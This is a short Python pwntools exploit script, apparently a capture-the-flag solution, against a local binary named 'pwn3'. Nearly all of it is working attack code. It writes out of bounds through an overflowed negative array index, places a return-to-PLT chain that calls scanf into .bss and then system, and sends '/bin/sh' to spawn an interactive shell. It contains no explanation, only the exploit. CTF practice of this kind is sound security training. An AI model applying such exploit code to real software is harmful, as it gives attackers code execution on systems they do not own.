#!/usr/bin/python
from pwn import *
# context.log_level = 'debug'
p = process('pwn3')
elf = ELF('pwn3')
p.recvuntil('name \n')
p.sendline('daddy')

def send(index = None, value = None):
    p.recvuntil('index\n')
    p.sendline(str(index))
    p.recvuntil('value\n')
    p.sendline(str(value))

# gdb.attach(p, "b *0x080486EA") # break at leave
# gdb.attach(p, "b *0x80486b6") # b at array of index
payload = [
        elf.plt['__isoc99_scanf'],      # scanf
        elf.plt['system'],              # ret to system 
        0x0804884B,                     # %9s
        elf.symbols['__bss_start'],     # bss
        0xdeadbeef,                     # padding
        0xdeadbeef,0xdeadbeef,0xdeadbeef,0xdeadbeef,0xdeadbeef
        ]
for i in range(10):
    send(-0x80000000+14+i,str(payload[i]))

p.recv()
p.sendline('/bin/sh\x00')
log.success('now enjoy your shell')
p.interactive()
